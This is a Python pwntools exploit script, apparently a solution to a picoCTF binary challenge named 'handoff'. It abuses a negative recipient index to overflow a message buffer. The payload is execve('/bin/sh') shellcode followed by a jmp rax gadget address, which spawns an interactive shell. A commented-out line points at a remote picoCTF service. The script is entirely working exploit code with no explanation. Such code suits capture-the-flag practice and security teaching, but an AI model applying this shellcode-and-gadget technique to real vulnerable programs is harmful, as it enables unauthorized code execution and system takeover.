from pwn import *

binary = './handoff'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = process(binary)
# r = remote('shape-facility.picoctf.net', 54989)

def add_entry(name):
    r.sendlineafter(b'What option would you like to do?', b'1')
    r.sendlineafter(b'What\'s the new recipient\'s name: ', name)

def add_message(choice, message):
    r.sendlineafter(b'What option would you like to do?', b'2')
    r.sendlineafter(b'Which recipient would you like to send a message to?', choice)
    r.recvuntil(b'What message would you like to send them?')
    print(f'Len: {len(message)}')
    r.sendline(message)

def exit(feedback):
    r.sendlineafter(b'What option would you like to do?', b'3')
    r.sendlineafter(b'Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it:', feedback)

JMP_RAX = 0x000000000040116c

shellcode = asm('''
    mov rax, 0x3b
    mov rdi, 0x0068732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
''')

payload = flat([
    shellcode.ljust(40, b"\00"),
    JMP_RAX,
])
add_message(b'-1', payload)
r.interactive()
